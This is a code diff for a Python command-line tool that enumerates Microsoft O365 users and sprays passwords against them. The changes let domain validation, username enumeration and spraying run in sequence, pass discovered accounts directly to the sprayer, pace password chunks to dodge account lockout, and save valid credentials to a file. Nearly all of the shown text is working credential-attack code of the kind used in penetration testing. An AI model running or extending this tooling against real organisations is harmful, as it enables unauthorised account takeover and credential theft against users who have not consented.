@@ -223,7 +223,7 @@ class Sprayer:
             if status in self.codes.keys():
                 if status != 200:
                     output += " (Manually confirm [2FA, Locked, etc.])"
-                
+
                 print("[%s%s%s] %s:%s" % (text_colors.green, self.codes[status], text_colors.reset, user, password))
                 self.valid_creds[user] = password
 
@@ -260,6 +260,11 @@ class Sprayer:
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Microsoft O365 User Enumerator and Password Sprayer")
+    # group = parser.add_mutually_exclusive_group(required=True)
+    parser.add_argument("-v", "--validate", action="store_true", help="Validate a domain is running O365")
+    parser.add_argument("-e", "--enum",     action="store_true", help="Perform username enumeration")
+    parser.add_argument("-s", "--spray",    action="store_true", help="Perform password spraying")
+
     parser.add_argument("-u", "--username",  type=str,   help="Username(s) delimited using commas")
     parser.add_argument("-p", "--password",  type=str,   help="Password(s) delimited using commas")
     parser.add_argument("-U", "--usernames", type=str,   help="File containing list of usernames")
@@ -271,16 +276,11 @@ if __name__ == "__main__":
     parser.add_argument("--proxy",   type=str, help="Proxy to pass traffic through: <ip:port>")
     parser.add_argument("--threads", type=int, help="Number of threads to run. Default: 10", default=10)
     parser.add_argument("--output",  type=str, help="Output file name for enumeration and spraying")
-    parser.add_argument("--debug",   action="store_true", help="Debug output")
     parser.add_argument("--paired",  action="store_true", help="Password spray pairing usernames and passwords (1:1).")
+    parser.add_argument("--debug",   action="store_true", help="Debug output")
 
     parser.add_argument("--spray-secondary",    action="store_true", help="Use `ActiveSync` for password spraying instead of `Autodiscover`")
     parser.add_argument("--validate-secondary", action="store_true", help="Use `openid-configuration` for domain validation instead of `getuserrealm`")
-
-    group = parser.add_mutually_exclusive_group(required=True)
-    group.add_argument("-e", "--enum",     action="store_true", help="Perform username enumeration")
-    group.add_argument("-s", "--spray",    action="store_true", help="Perform password spraying")
-    group.add_argument("-v", "--validate", action="store_true", help="Validate a domain is running O365")
 
     args = parser.parse_args()
 
@@ -303,37 +303,53 @@ if __name__ == "__main__":
     # Perform domain validation
     if args.validate:
         validator = Validator(args.domain, proxy=args.proxy, debug=args.debug, secondary=args.validate_secondary)
+        print("[*] Performing O365 validation use for: %s" % args.domain)
         validator.validate()
+        # Ensure we do not perform any other function if domain is not O365
+        if not validator.o365:
+            (args.enum, args.spray) = (False, False)
 
     # Perform user enumeration
-    elif args.enum:
+    if args.enum:
         # We chose to parse files first
         username_list = helper.get_list_from_file(args.usernames) if args.usernames else args.username.split(',')
         enum = Enumerator(username_list, proxy=args.proxy, debug=args.debug, threads=args.threads)
+        print("[*] Performing user enumeration against %d potential users" % (len(username_list)))
         enum.loop.run_until_complete(enum.run())
         helper.print_stats("User Enumeration", enum.valid_accts, ("valid_users.txt" if not args.output else args.output))
 
     # Perform password spray
-    elif args.spray:
-        # We chose to parse files first
-        username_list = helper.get_list_from_file(args.usernames) if args.usernames else args.username.split(',')
-        password_list = helper.get_list_from_file(args.passwords) if args.passwords else args.password.split(',')
-
-        spray = Sprayer(username_list, proxy=args.proxy, debug=args.debug, threads=args.threads, secondary=args.spray_secondary)
-
-        if not args.paired:
-            for password_chunk in helper.get_chunks_from_list(password_list, args.count):
-                print("[*] Password spraying the following passwords: [%s]" % (", ".join("'%s'" % password for password in password_chunk)))
-                spray.loop.run_until_complete(spray.run(password_chunk))
-                if not helper.check_last_chunk(password_chunk, password_list):
-                    helper.lockout_reset_wait(args.lockout)
+    if args.spray:
+        # Use validated users if enumeration was run
+        if args.enum:
+            username_list = enum.valid_accts
 
         else:
-            print("[*] Password spraying using paired usernames and passwords.")
-            spray.loop.run_until_complete(spray.run_paired(password_list))
-            # Since we are pairing usernames and passwords, we can ignore the lockout reset wait call
+            username_list = helper.get_list_from_file(args.usernames) if args.usernames else args.username.split(',')
 
-        helper.print_stats("Password Spraying", spray.valid_creds, ("valid_credentials.txt" if not args.output else args.output))
+        # Make sure we actually have users to spray (for when enum is run first)
+        if len(username_list) > 0:
+            password_list = helper.get_list_from_file(args.passwords) if args.passwords else args.password.split(',')
+
+            spray = Sprayer(username_list, proxy=args.proxy, debug=args.debug, threads=args.threads, secondary=args.spray_secondary)
+
+            print("[*] Performing password spray against %d users" % (len(username_list)))
+            if not args.paired:
+                for password_chunk in helper.get_chunks_from_list(password_list, args.count):
+                    print("[*] Password spraying the following passwords: [%s]" % (", ".join("'%s'" % password for password in password_chunk)))
+                    spray.loop.run_until_complete(spray.run(password_chunk))
+                    if not helper.check_last_chunk(password_chunk, password_list):
+                        helper.lockout_reset_wait(args.lockout)
+
+            else:
+                print("[*] Password spraying using paired usernames and passwords.")
+                spray.loop.run_until_complete(spray.run_paired(password_list))
+                # Since we are pairing usernames and passwords, we can ignore the lockout reset wait call
+
+            helper.print_stats("Password Spraying", spray.valid_creds, ("valid_credentials.txt" if not args.output else args.output))
+
+        else:
+            if args.debug: print("\n[DEBUG] No users to run a password spray against.")
 
     elapsed = time.time() - start
     if args.debug: print("\n[DEBUG] %s executed in %0.2f seconds." % (__file__, elapsed))
